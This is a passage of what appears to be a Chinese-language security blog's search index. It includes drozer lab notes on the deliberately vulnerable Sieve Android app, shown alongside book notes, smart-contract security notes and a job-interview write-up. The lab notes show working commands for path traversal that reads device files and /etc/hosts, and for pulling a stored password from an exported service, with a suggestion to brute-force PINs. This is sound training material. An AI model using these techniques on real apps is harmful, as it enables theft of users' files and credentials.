(FileNotFoundException e) { Log.e(TAG, \u0026#34;ERROR: unable to open file: \u0026#34; + e.getMessage()); return null; } } 實際讀取文件或是Path Traversal 為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取 $ echo \u0026#34;this is secret file\u0026#34; \u0026gt; /storage/emulated/0/Download/secret.txt dz\u0026gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt Attempting to run shell module this is secret file dz\u0026gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts Attempting to run shell module 127.0.0.1 localhost ::1 ip6-localhost 也可以利用drozer自動找尋path traversal的漏洞在哪裡 dz\u0026gt; run scanner.provider.traversal -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider Vulnerable Providers: content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.FileBackupProvider/ "},{"id":486,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/","title":"Test Sieve - is debuggable","section":"Tools","content":" Test Sieve - is debuggable # dz\u0026gt; run app.package.debuggable Attempting to run shell module Package: org.owasp.goatdroid.fourgoats UID: 10286 Permissions: - None. Package: com.mwr.example.sieve UID: 10285 Permissions: - None. Package: com.withsecure.dz UID: 10284 Permissions: - None. Package: jakhar.aseem.diva UID: 10282 Permissions: - None. "},{"id":487,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/","title":"Test Sieve - services exported","section":"Tools","content":" Test Sieve - services exported # 列出exported services有哪些 dz\u0026gt; run app.service.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission: null com.mwr.example.sieve.CryptoService Permission: null 逆向 從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service， 在com.mwr.example.sieve.AuthService中的其中一段就是有問題的地方: public class AuthService extends Service { ... private final class MessageHandler extends Handler { ... public void handleMessage(Message msg) { ... switch (msg.what) { case 4: ... case AuthService.MSG_CHECK /* 2354 */: if (msg.arg1 == AuthService.TYPE_KEY) { responseCode3 = 42; String recievedString = returnBundle.getString(\u0026#34;com.mwr.example.sieve.PASSWORD\u0026#34;); if (AuthService.this.verifyKey(recievedString)) { AuthService.this.showNotification(); returnVal2 = 0; } else { returnVal2 = 1; } } else if (msg.arg1 == AuthService.TYPE_PIN) { responseCode3 = 41; String recievedString2 = returnBundle.getString(\u0026#34;com.mwr.example.sieve.PIN\u0026#34;); if (AuthService.this.verifyPin(recievedString2)) { returnBundle = new Bundle(); returnBundle.putString(\u0026#34;com.mwr.example.sieve.PASSWORD\u0026#34;, AuthService.this.getKey()); returnVal2 = 0; } else { returnVal2 = 1; } } else { sendUnrecognisedMessage(); return; } sendResponseMessage(5, responseCode3, returnVal2, returnBundle); return; ... 首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的com.mwr.example.sieve.PIN的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵com.mwr.example.sieve.PASSWORD以及我們之前設定的password，並且回傳response message給我們 →[5, 41, 0, {com.mwr.example.sieve.PASSWORD:\u0026lt;password\u0026gt;}] 而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了 和service互動 從下面的結果來看，一開始設定的密碼為==123456acitseccom== dz\u0026gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN \u0026lt;User PIN\u0026gt; --bundle-as-obj Attempting to run shell module Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService: what: 5 arg1: 41 arg2: 0 Extras com.mwr.example.sieve.PASSWORD (String) : 123456acitseccom "},{"id":488,"href":"/tools/others/android-related/mobsf/test-sieve-by-mobsf/","title":"Test Sieve by MobSF","section":"Tools","content":" Test Sieve by MobSF # 這個工具真的很完整，而且蠻萬用的，光是靜態分析就很詳細\nStatic Analysis # Overview 一開始就告訴測試者有多少的東西被export，和Drozer分析的一樣 Application Permission MobSF還可以分析實際寫的code並且查看哪邊有Permission相關的威脅，在Code Analysis的地方有重複的提到External Read/Write的漏洞 Manifest Analysis 這一段就很像Drozer做attack surface後的結果，也就是activity/service/broadcast receiver/content providers exported + is debuggable Activity Exported Service Exported Content Providers Exported 在Code Analysis的地方有重複的提到這個漏洞 Debuggable 在Code Analysis的地方有重複的提到這個漏洞 其他 版本過低 Backupable 和最近的CVE PoC分析 這個功能蠻好的，例如下圖，這三個漏洞都是去分析FileSelectActivity/MainLoginActivity/PWList得出可能會有StrandHogg 2.0 或StrandHogg的問題，關於StrandHogg 2.0 的說明可以看twcert的文章，簡單來說這個惡意軟體的效果是常駐在各個正常執行的軟體背後，並且竊取一些機敏資料 StrandHogg 2.0 的運作原理，和去年發現的 StrandHogg 相當類似，都可在感染後將自己隱藏在正常的軟體身後；當用戶開啟正常軟體時，真正執行的並不是這個正常版的軟體，而是植入了惡意軟體程式碼的「分身」。 新版 StrandHogg 2.0 除了上述的類似功能外，還能讓惡意軟體偽裝成任意的 Android App；先前的版本只能偽裝成 TaskAffinity 這支 App，甚至能在用戶點按開啟任何 App 時立刻偽裝成該 App。\nCode Analysis SQL DB可以被Access Hardcoded Sensitve Data including IP Debuggable Read/Write External Storage Dynamic Analysis # "},{"id":489,"href":"/books-notes/the-decameron-%E5%8D%81%E6%97%A5%E8%AB%87/","title":"The Decameron (十日談)","section":"Books Notes","content":" The Decameron (十日談) # 諷刺: 1.5, 1.8, 1.9, 1.10 教會: 1.1, 1.2, 1.6 歷史相關: 2.6 寓言故事(利用故事達成目的): 1.3, 1.7 聰明機制(利用計謀達成訴求或傳遞訊息): 1.4 莫名其妙: 2.1, 2.3 一般故事: 2.2, 2.4, 2.5 特別吐槽 # 1.5 那個侯爵夫人也太自戀了吧，這樣就覺得人家是專門來看自己姿色的，阿那個法王也是很身體力行，好色過頭了吧，為了看人家的老婆還千里迢迢順便去別的國家，還要想一下名目，會不會太累，阿最後的那個全部都是母雞的隱喻，還是無法完全get到，到底是三小\u0026hellip; 1.7 史卡拉這個貴族要開宴會，很多人都去了，但他臨時取消，因此給很多人補貼，但其中他刻意不給貝加密諾這個人，也不通知他取消宴會，總之就是不爽給，而貝加密諾就直接在客棧住下來等到史卡拉願意給為止，還引經據典的說了一個故事，最後就是用嘴遁，讓史卡拉付錢 但…貝加密諾憑什麼要求史卡拉要給補償，按照故事的說法，史卡拉沒有邀請貝加密諾來參加宴會，因為貝加密諾後面引用的故事也說波里瑪索也是自願前往修道院院長家，雖然史卡拉沒有跟貝加密諾說取消宴會，但他本來就沒有邀請他去啊，是要補償什麼，整個就是一個很沒邏輯的故事… "},{"id":490,"href":"/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/","title":"The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes","section":"Survey Papers","content":" The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes # tags: Meeting Paper NTU Seminar # :::info Zhou, H., Milani Fard, A., \u0026amp; Makanju, A. (2022). The state of ethereum smart contracts security: Vulnerabilities, countermeasures, and tool support. Journal of Cybersecurity and Privacy, 2(2), 358-378. :::\nBackground # :::spoiler 以太幣(Ether) VS 以太坊(Ethereum)\n以太坊是一個區塊鏈平台，而以太幣是裡面所使用的貨幣，智能合約的運算費用、區塊鏈上的交易手續費、礦工挖礦的獎勵等，都會用以太幣支付。\n以太坊目的是打造一個「去中心化的世界電腦」，執行的方式是透過區塊鏈技術，實現去中心化智能合約平台，以太坊和比特幣一樣具有可挖礦的公鏈系統，但多了智能合約、Dapp的技術。 ::: :::spoiler What is Smart Contract? 智能合約是一種將雙方的協議條款，並用代碼形式在區塊鏈上運行，儲存在一個公共資料庫中，不能被更改。\n智能合約中發生的交易是由區塊鏈處理的，這意味著它們可以在沒有第三者的情況下自動執行，只有當協議中的條件得到滿足時，交易才會發生，是完全去中心化的交易。\n智能合約 VS 傳統合約 # 傳統合約 # 雙方合作簽約後，雙方或者多方協議，做或不做某事來換取某些東西，而合約中的任何一方必須信任彼此並履行義務。同時還必須有個第三方的執法機構介入，若是有一方違反條款，就需要這個執法機構進行判決。\n智能合約 # 雙方合作線上簽署合約，合約為一個運行在區塊鏈的代碼，儲存在一個公共資料庫中，不能被更改。雙方或者多方協議，做或不做某事來換取某些東西，但不需要信任彼此，因為合約內容會完全自動強制執行，公開透明不會被更改。\n舉例來說 # 如果小明要買大明的房子，簽訂的是智能合約，合約運行在以太坊區塊鏈，合約內容為：當小明向大明支付300個以太幣時，小明將獲得房子的所有權。\n一旦這個智能合約簽訂好就不能被改變，這意味著小明可以放心支付300個以太幣來買大明的房子，而不用擔心大明反悔。如果是使用傳統合約，小明買房子可能要支付第三方公司的大量費用，例如銀行、律師和房屋經紀人、佣金…等等，也需要花費許多的時間。但使用了智能合約，不僅完全省略了第三方公司的介入，也可以縮短整個合約進行的時間。 :::\n:::spoiler What is Solidity?\nSolidity 是一種合約式導向的程式語言，用來撰寫智能合約，它受到 C++、Python 和 Javascript 語言影響，語法設計參考了 ECMAScript，所以對於寫過 Javascript 的人，相對好上手。\nSolidity 是靜態型語言，編譯後可以在 EVM 上執行。撰寫以太坊的智能合約，除了可以用 Solidity 語言，還有 Vyper 語言可以選擇。\nEVM (Ethereum Virtual Machine)：中文翻譯為「以太坊虛擬機」，是智能合約的運行環境。 ::: :::spoiler What is Merkle Patricia Tree\n是一種經過改良的、融合了Merkle tree (hash tree)和Radix tree 的優點的數據結構\n可以理解為把帳本分割成無數個小的資料塊，每個資料塊像是一棵樹中的無數葉片，而我們把每兩個相鄰的葉片合併成一個字串，並算出該字串的 Hash 值。經過無數次後，會得到一個包含了所有區塊資料的 Hash 值，稱為「Merkle Root」 ::: :::spoiler 【區塊鏈入門】到底什麼是Gas、Gas Price、Gas Limit？ 以太坊網路，也被稱為 Ethereum 區塊鏈。Ether（ETH）是該網路的燃料。當您發送代幣時，進行合約發送 ETH 或在區塊鏈上執行其他任何操作時，您必須為該計算付費，交易手續費以 Gas 計算，並以 Ether 支付。\nEthereum 區塊鏈內進行任何交易、執行智能合約、啟動 DApps 和支付數據存儲的手續費都被礦工收取。礦工對交易進行確認並確定哪些交易能進入新區塊。無論您的交易是成功還是失敗，您都需計算付費。即使失敗，礦工也必須驗證並執行您的交易（驗算），因此您必須支付驗算費用，就像成功支付交易一樣。 ::: :::spoiler What is Dapp Dapp (英文：Decentralised Application)是一個去中心化的應用程式，具有公開、不可竄改的特性。\n舉個例子： 像是我們在手機APP上玩小遊戲，這些遊戲數據都會傳到軟體公司的後台伺服器，但是要怎麼知道軟體公司有沒有偷改伺服器資料呢？\n所以就有人把遊戲寫成Dapp形式，公開遊戲程式並放到區塊鏈上，這樣沒有任何人可以更改程式內容，就連發佈者也不行。\n這就是一種去中心化應用程式的概念(具有透明公開、不可竄改、絕對忠實執行程式碼的特性)。 :::\n:::spoiler NIST \u0026amp; CFS\n什麼是 NIST 網路安全架構？ # 美國國家標準與技術研究所（NIST）\n成立於 1901 年，現在是美國商務部的一員。NIST 是美國最古老的物理科學實驗室之一。美國國會成立了該機構，以改善當時的二流測量基礎設施。該基礎設施是美國工業競爭力的一大挑戰，已落後於英國和德國等其他經濟大國。\n美國取決於關鍵基礎設施的可靠運作。網絡安全威脅利用關鍵基礎設施系統日益複雜性和互連性。他們使美國的安全，經濟和公共安全和健康處於危險之中。與財務和聲譽風險類似，網絡安全風險會影響公司的利潤。它可以提高成本並影響收入。它可能會損害組織的創新能力，以及獲得和維護客戶的能力。最終，網絡安全可以擴大組織的整體風險管理。\nNIST 網路安全架構 (CSF) 受到全球各國政府和產業的支援，作為任何組織使用的建議基準，無論產業或規模如何。NIST 網路安全架構包含三個主要元件：架構核心、設定檔和實作層。框架核心包含所需的網絡安全活動和成果，分為 23 個類別，涵蓋了組織的廣泛網絡安全目標。配置文件包含組織對其組織需求和目標，風險偏好以及使用框架核心所需結果的資源的獨特一致性。實施層描述了組織的網絡安全風險管理實踐表現框架核心中定義的特徵的程度。 ::: :::spoiler DAO遭駭事件\nAttack Method # 在攻擊前一周，駭客先提出一項研究專案，向The DAO平臺（母DAO專案）申請研究經費，專案通過後，因此分出一個DAO子專案，並在一周後執行智能合約分割功能splitDAO來建立新專案。\n接著母DAO專案會透過Token建立程序，先撥款（以太幣）給子DAO專案，之後才進行扣款動作，來刪減母DAO帳目的以太幣數目。不過，當母DAO執行withdrawRewardFor程式，要撥款給子DAO時，駭客透過自訂智能合約的功能，再次呼叫splitDAO功能，趕在扣款指令還未進行之前，再次執行專案建立功能進行再次撥款，因扣款完成前，用戶以太幣餘額仍是正值，在母DAO來不及更新平衡帳目前，這項新建專案和撥款的動作，可以不斷地重複執行。\n高靖鈞說，透過遞迴的攻擊，駭客讓母DAO不斷撥款，最後一共盜領了約370萬個以太幣，以當時以太幣市價每個約20美元來計算，遭竊了價值約7,200萬美元的以太幣。 ::: :::spoiler What is Common Weakness Enumeration, CWE CWE這個計畫中維護了一個軟體弱點的列表，而這個計劃的主要目的是希望能夠建構一個描述軟體存在於架構、設計或程式碼中安全威脅的通用語言，而且能夠成為一個軟體安全工具在修補弱點時能參照的標準，更重要的是，能夠透過這樣的列表，將每個弱點的特徵、緩解方式及預防方式記錄下來，讓所有人能夠參考應用。 CWE Website Link ::: :::spoiler 開發智能合約 - ABI ABI (Application Binary Interface)\nABI 裡記載了智能合約提供哪些函式，以及應該要傳入什麼樣的參數。 當你要開發 DApp 時，需要兩個值，才能跟智能合約溝通，一個是合約位址，另一個就是一個是 ABI 了。 :::\nContent Note # :::spoiler Function Signature \u0026amp; Function Selector\nFunction 的完整字串實際上也就是所謂的 Function Signature，而哈希過後得到的 ABI Byte String 便是 Function Selector。\n當我們要和「不需要」任何參數的 \u0026ldquo;Getter\u0026rdquo; Function 互動時，可以取函式簽章進行 keccak256 hash 後的前四個 bytes function myUint() bytes4(keccak256(\u0026ldquo;myUint()\u0026rdquo;)); 當我們要和「需要」參數的 \u0026ldquo;Getter\u0026rdquo; Function 互動時，則需要把參數型態也包入進行 hash 再取前四個 bytes function someFunction(uint _myUint1, address _someAddr) bytes4(keccak256(\u0026ldquo;someFunction(uint256,address)\u0026rdquo;)) contract MyContract { function myFunction(uint256 arg1, string memory arg2) public returns (bool) { // function implementation } } // Call myFunction with function signature function callMyFunction(address contractAddress) public { bytes4 functionSelector = bytes4(keccak256(bytes(\u0026#34;myFunction(uint256,string)\u0026#34;))); bool success = contractAddress.call(functionSelector, 123, \u0026#34;hello world\u0026#34;); require(success, \u0026#34;Function call failed.\u0026#34;); } 正常來說應該是要像這樣，在call function之前，利用hash function把function signature做hash，變成function selector之後才能呼叫和傳參數，所以如果沒有做這個動作的話，就會觸發fallback function，這樣就有Re-Entrancy的風險\n目的：\n@楊冠彥: 因為在智慧合約部分我們最終要轉換為bytecode給電腦讀，那function signature就是你寫的一個function，之後要轉換為function selector，顧名思義要對該function簽章 :::\n:::spoiler Delegatecall VS Call and its vulnerability Delegatecall VS Call 其實就是call function後的結果會被保留的地方不同而已，比方說合約DelegateCall要\u0026quot;Call\u0026ldquo;合約TestDelegateCall，則運算的數值(num \u0026amp; sender)會被保留在合約TestDelegateCall，但是如果合約DelegateCall要\u0026rdquo;delegateCall\u0026ldquo;合約TestDelegateCall，則運算的數值(num \u0026amp; sender)會被保留在合約DelegateCall\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract TestDelegateCall { uint public num; address public sender; function setVars(uint _num) public { num = _num * 2; sender = msg.sender; } } contract DelegateCall { uint public num; address public sender; function setVars(address _contract, uint _num) public { //(bool success, ) = _contract.delegatecall(abi.encodeWithSelector(TestDelegateCall.setVars.selector, _num)); (bool success, ) = _contract.call(abi.encodeWithSelector(TestDelegateCall.setVars.selector, _num)); require(success, \u0026#34;Fail to execute delegatecall\u0026#34;) } } Delegatecall Vulnerability :::\n:::spoiler 3 Address Code\nThree address code is a type of intermediate code which is easy to generate and can be easily converted to machine code. It makes use of at most three addresses and one operator to represent an expression and the value computed at each instruction is stored in temporary variable generated by compiler. The compiler decides the order of operation given by three address code. :::\n:::spoiler What is Oyente\nBuilt by Loi Luu and his team at the National University of Singapore, Oyente is a symbolic analysis tool to catch security vulnerabilities in Ethereum contracts and EVM bytecode. :::\n:::spoiler What is ANTLR\nANTLR 是一套威力強大的 Parser Generator (解析一份 DSL 語言的程式碼產生器)，可以用來讀取、解析、執行、轉譯一份結構化的文字或二進位檔案。這套工具通常用來打造一個程式語言、工具或框架。 :::\n:::spoiler Taint Analysis \u0026amp; Symbolic Execution\n污點分析 (taint analysis) 跟符號執行 (symbolic execution)，前者可以知道資料的走向並作分析，後者可以算出如果要走到特定的 function，輸入需要滿足怎樣的條件。當這兩個技術運用在 fuzzing 當中，fuzzer 就能走到條件比較嚴苛的 function，藉此增加程式 coverage，或者就只需要針對輸入中比較有興趣的資料做 mutation。\nTaint analysis 中文翻譯為污點分析，是一種 data flow tracking 的技巧，通常被用來檢測惡意的資料流向，藉此得知程式當中哪些地方可能會發生問題。 程式當中充斥許多 if-else condition，這些條件判斷使得程式在不同的情況下有不同的處理方式，而每個 condition 都是將各個變數的比較做組合。如果將這些 condition 轉換成數學式子，則會發現有許多共通之處，像是靜態期間變數的值無從得知，就對應到數學當中的未知數；大於、等於與小於的比較在數學中也有相同的行為，因此科學家嘗試用符號表示變數，\u0026ldquo;模擬\u0026quot;變數的值來執行程式，藉此通過特定路徑，獲得輸出結果，而這樣的處理也被稱作符號執行 (symbolic execution)。 概念就是把程式的變數視為符號，並且把走到特定 function 的路徑上所有 if-else 條件組合起來，解出各個符號的值需要在什麼範圍當中，最後產生對應的 input 來滿足這些條件\n目前常看見使用到 symbolic execution 的工具有 z3、angr (底層使用 Claripy solver) ::: "},{"id":491,"href":"/job/interview/trapa-interview/","title":"Trapa Interview","section":"Jobs","content":" Trapa Interview # 面試流程 # 一面 # (1HR)一面主要是ddaa主面，人非常的好也很願意給我建議和修正的地方，一開始主要針對公司在開發的平台以及整體公司現況做簡單的說明，接著就直接進到自我介紹，完了之後開始針對自我介紹的內容做非常詳細的詢問，諸如目前實習的地方主要是在幹麻、開發的東西是什麼、IPS和Firewall的品牌是什麼之類的(因為我主要是針對公司內部開發一個防火牆的整合系統所以會被問這個東西)，還有針對我寫的各種文章、藍隊的題目靶機(BTLO、Cyberdefenders)有沒有印象深刻的題目、以及針對比賽的經驗、有沒有什麼特別令人印象深刻的地方或是題目是很有成就感的(因為我跟他說參加過去年和今年的EOF，所以針對決賽的A\u0026amp;D以及KoH會比較多問題)等等，總之這一段我個人認為就是閒聊，主要了解我的個人經歷以及目前的經驗到哪裡，但是還是那句老話，自己的經驗有多少寫多少，不要不是自己做的也寫上去，不然被問爆就會露出馬腳\n緊接著沒記錯的話就是問一些比較和資安專業的問題(這一個階段是在不上網Google的情況之下以自己本身的經驗和知識回答)，我記得的題目有\n什麼是Mitre ATT\u0026amp;CK SOC團隊主要是幹嘛的 有沒有什麼特別印象深刻的APT攻擊 什麼是IDS、IPS、EDR、MDR 最後一題答的非常不好，應該說我之前有接觸過但真的一時忘記的，所以就只能交給ddaa幫忙改正我的答案，這邊再寫一次好了，以免忘記\nIDS(Intrusion Detection System, 入侵偵測系統) 從名字就可以看的出來，他是針對流入流出的各種封包的偵測系統，也就是獨立於Firewall的旁之，如果他有檢測到封包內有什麼異常的Payload或是pattern，就會跳出告警，但就僅只於此，不會再做更多的操作 IPS(Intrusion Prevention System, 入侵防禦系統) IPS就是要改進上述的問題，他主打的就是偵測到快快的東西就會主動的防禦掉，但這樣還是有一個問題，現今的攻擊手法越來越多種，而且有時候是那種可以包裝成安全落地的形式，必須要在本地端監控才有辦法知道 EDR(Endpoint Detection and Response, 端點偵測與應對) EDR就是在做這樣的事情，可是有可能會有一個疑問，每個人的主機內不是都有安裝那種傳統的Windows Defenders或是小紅傘那種東西，為什麼還需要有EDR，其實現今的攻擊手法已經有很大的變化，有可能單純看個人的裝置會看不出個所以然，必須要聯合其他的裝置一起做關聯性的比對才會知道目前是不是正在遭受攻擊，所以EDR強大的地方在於他做到各個裝置endpoint端點的串聯，讓資安事件的偵測和防禦可以更嚴謹，這也是中小型企業最需要的資安產品 MDR(Managed Detection and Response, 受管式偵測與應對) 這東西其實就是一個EDR+SOC的服務衍生的產品，但ddaa說這個東西要做出市場區隔可能還沒有到太創新 (1HR)緊接著就是人生第一次的白板題，題目敘述如下: 有一個遊戲，規則是有一個炸彈，炸彈上有好幾條線，每一條線都有三個特徵，我必須根據這三個特徵判斷文氏圖並且決定要不要剪斷這一條線，文氏圖如下，這是我從網路上找到最像題幹的圖片 剛剛講到每一條線的三個特徵分別是: 線的一端連接的LED有沒有亮、該條線的顏色(是否為紅或藍或非藍也非紅或是同時是藍也是紅)、線的另外一端有無標示星號，依照上圖來說，A區域就是有無星號、B區域是LED有無亮、C區域是線是紅色、D區域是線是藍色，所以假設現在有一線的三個特徵是有LED、有星號且是紅色，則我們應該要圈A、B和C，最後的交集就是44和32，當然當時的題目不是這些數字，他是有代號的，共有五個C、D、S、P、B，分別代表: C: 無條件剪斷線 D: 暫時先不要剪斷，根據搭配到的其他代號(S、P、B)進行後續驗證 S: 如果炸彈的序列號為偶數則剪斷線 P: 如果炸彈有Port號也要剪斷線 B: 如果炸彈的電池有兩個以上也要剪斷線\n總結一下上述的問題: Input: 線的三個特徵(LED亮暗或閃爍、線的顏色、有無星號)以及炸彈的三個特徵(序列號、電池數量、Port號) Output: 根據以上的狀態判段該條線要不要剪斷\n以下附上我的Source Code: :::spoiler Source Code\ntry: led_light = input(\u0026#34;LED Light Or Not Or Flashing (Y/N/F): \u0026#34;).upper() assert led_light == \u0026#34;Y\u0026#34; or led_light == \u0026#34;N\u0026#34; or led_light == \u0026#34;F\u0026#34; if led_light == \u0026#34;F\u0026#34;: led_light = \u0026#34;N\u0026#34; star_or_not = input(\u0026#34;Star Or Not (Y/N): \u0026#34;).upper() assert star_or_not == \u0026#34;Y\u0026#34; or star_or_not == \u0026#34;N\u0026#34; cable_color = input(\u0026#34;Cable Color (R/B): \u0026#34;).upper() assert cable_color == \u0026#34;R\u0026#34; or cable_color == \u0026#34;B\u0026#34; bomb_feature_serial = int(input(\u0026#34;Bomb Feature Serial (number): \u0026#34;)) assert bomb_feature_serial \u0026gt;= 0 bomb_feature_port = int(input(\u0026#34;Bomb Feature Port (number): \u0026#34;)) assert bomb_feature_port \u0026gt;= 0 bomb_feature_battery_num = int(input(\u0026#34;Bomb Feature Battery Number (number): \u0026#34;)) assert bomb_feature_battery_num \u0026gt;= 0 except ValueError: print(\u0026#34;Please input the correct value\u0026#34;) exit() def judge_venn_diagram(led_light, star_or_not, cable_color): if led_light == \u0026#34;Y\u0026#34;: if star_or_not == \u0026#34;Y\u0026#34;: if cable_color == \u0026#34;R\u0026#34;: return \u0026#34;D\u0026#34;, \u0026#34;B\u0026#34; elif cable_color == \u0026#34;B\u0026#34;: return \u0026#34;D\u0026#34;, \u0026#34;P\u0026#34; else: if cable_color == \u0026#34;R\u0026#34;: return \u0026#34;B\u0026#34;, \u0026#34;S\u0026#34; elif cable_color == \u0026#34;B\u0026#34;: return \u0026#34;P\u0026#34;, \u0026#34;S\u0026#34; elif led_light == \u0026#34;N\u0026#34;: if star_or_not == \u0026#34;Y\u0026#34;: if cable_color == \u0026#34;R\u0026#34;: return \u0026#34;C\u0026#34;, \u0026#34;P\u0026#34; elif cable_color == \u0026#34;B\u0026#34;: return \u0026#34;P\u0026#34;, \u0026#34;D\u0026#34; else: return \u0026#34;S\u0026#34;, \u0026#34;D\u0026#34; def judge_digit(digit): if \u0026#34;D\u0026#34; in digit: if \u0026#34;S\u0026#34; in digit: return judge_bomb_feature_serial(bomb_feature_serial) elif \u0026#34;P\u0026#34; in digit: if bomb_feature_port: return True else: return False elif \u0026#34;B\u0026#34; in digit: return judge_bomb_feature_battery_num(bomb_feature_battery_num) elif \u0026#34;C\u0026#34; in digit: return True def judge_bomb_feature_battery_num(bomb_feature_battery_num): if bomb_feature_battery_num \u0026gt;= 2: return True return False def judge_bomb_feature_serial(bomb_feature_serial): if bomb_feature_serial % 2 == 0: return True return False def main(): print(\u0026#34;Start Game\u0026#34;) num1, num2 = judge_venn_diagram(led_light, star_or_not, cable_color) if judge_digit([num1, num2]): print(\u0026#34;Cut\u0026#34;) else: print(\u0026#34;Don\u0026#39;t Cut\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() ::: 當時是依照CodePilot和ChatGPT生出一些關鍵的語法再加上我自己的邏輯寫出來的，其實這一題算是簡單，我的留程是先借由線的三個特徵判斷文氏圖會圈出哪兩個字母(每一次一定都會圈出兩個字母，且C和D這兩個互斥的情況不會出現，一定是C或是D搭配SPB其中一個字母) :::info 這邊要特別再說明一下，如果是閃爍就視為暗，如果LED沒有亮就代表我在圈文氏圖的時候要用排斥的角度看他，舉例來說如果LED沒亮、但是有星號且線為紅色，B圈到的部分就不能算，所以以上圖來說就會是420和432這兩個數字，如果是LED沒亮也沒有星號且線為紅色，則圈出來的部分就是1058和485這兩個數字，不知道這樣的說明夠不夠清楚 ::: 總之，這個階段就需要不斷的和面試官來回詢問和溝通Spec的要求，我問了超多問題，例如: 閃爍的時候算不算一個新的狀態因為原本的Spec上沒有提到，結果ddaa說當成暗；剛開始的時候也對這個題目很矇，想說到底在衝三小，所以我直接問有沒有什麼是比較好的方式可以判斷文氏圖圈出哪些字母，ddaa說可以直接用if-else判斷就好，這也讓我有個底，如果只是利用到if-else，那題目應該不會很難，至少我是個會把問題複雜化的人，所以我在寫的時候就直接用最暴力的方式，就用巢狀if-else判斷所有狀態；我還問了上面特別提到的問題，如果特徵是否定的情況要怎麼處理，其實也就是要用排除的方式看待他等等問題，最後的結論是有寫出來，方向也大致上和ddaa預想的差不多，只是有一些小陷阱和可以改進的地方\n陷阱就是我沒有考慮到非藍也非紅以及既是藍也是紅的這兩種情況，所以我判斷文氏圖的地方還缺了八個狀態沒有寫到，我會出現這個錯誤是因為Spec沒有寫這個東西，不過ddaa在一開始敘述題幹的時候有用一句話帶過，當時應該要稍微留心一下這個問題，只能說有時候Spec上的東西不會寫出全部的東西，還是需要透過不斷的和面試官溝(套)通(話)，才有機會避開這些陷阱 我想說這是一個遊戲，所以會需要有input給玩家輸入前面提到的六個狀態，但是ddaa說在業界我們不會這樣設計，在一開始寫code之前就會設定好用file的方式餵進去script中，只是要設定好資料的format 被稱讚的地方: 流程清楚也符合邏輯、會針對input的資料進行檢查、最重要的是會和需求方不斷的溝通不同狀態下應該要有什麼樣的要求，這件事在業界是很重要的 (20Min)白板題結束之後還有檢討一下，之後就要稍微進入問答，包含展示了目前公司開發的各項產品以及功能，並實際demo出來，要針對公司方面的問題也可以在這個階段提問\n總體而言大概就是這樣\n二面 # 首先因為已經過了一天，記憶有點遺失，就邊寫邊回憶，當天流程是會先和主管一對一的面談，面談過程會互相丟問題，讓用人單位更理解我的能力在哪裡，接著就是針對公司的現況和產品做簡單的介紹，當天面我的是Jeff\n其實就跟上次一面的狀況很像，簡單的自我介紹，過程中時不時會丟出一些更詳細的問題，包含實習的內容(弱密碼掃描這個Project被問到有沒有玩過一些進階的功能或是可能可以做什麼樣的改善，我回答可以針對Wordlist做到Augmentation，Jeff說方向正確，但hashcat原本就有這個功能，預設不開，需要下一些rule讓他可以做到Wordlist的Permutation，聽說效果超群) 針對比賽也有聊到一些，例如今年和去年的EOF賽制不一樣，針對這一點我有大概解釋主辦單位的考量以及這個規則的缺點。還有，Jeff也問到這幾次比賽下來沒有得名的原因可能有什麼，除了賽制問題我也有提到經驗不足等等原因 還有問到有哪個Project是目前做過最有成就感?(有點忘記了)，我回答大學的專題，也就是結合臉部情緒以及肢體情緒做整合的系統，還問到中間遇到什麼特別的挑戰 平常的興趣或是如何排解壓力 紙筆測驗: 有問到一些和網路相關的問題，我又說我是網管，所以就有紙筆測驗，題目是: 現在有一個通外網的服務、Intranet(開發的)、內部的服務，這三個網段分別需要怎樣的部署，或是和外網通或不通，我的結論如下圖 首先外網服務一定要有WAF，外到內首先會有Firewall和IPS，接著接上Router，然後DMZ通常接收Request和送出Response都是同一個Session，所以和外網是一條獨立的連線；而Intranet和DMZ則是單向通，並且Intranet也有上網的服務，所以會有一條通出去，但是會和回傳回來的Response錯開所以會有兩條；最後是內部Service Internet和DMZ也是單向通，而和Intranet則是有選擇的通，因為還是要看實際案例要怎麼樣的部署，不然如果兩邊都正常通就沒有必要切出兩塊了 還有問到去年底參加的SOC課程(和中華資安的那個)學了什麼 有無多人開發的經驗、會不會用Git(我回答3人以上的沒有，但會用基本的Git) 有無管理3人以上的專案，不限課業上的也沒關係，我回答大學辦的電機營大約有100人左右，期間遇到的問題以及我怎麼解決的 有問到工作的期待、環境等 結論 # Offer保留到我畢業(我提議的)，期間也可以保持聯絡，並且Jeff建議我的觀念大部分都很OK，就是經驗缺乏，所以可以多刷一些Leetcode和Hacker Rangers\n"},{"id":492,"href":"/security/competition/tscctf-2024/","title":"TSCCTF 2024","section":"Securities","content":" TSCCTF 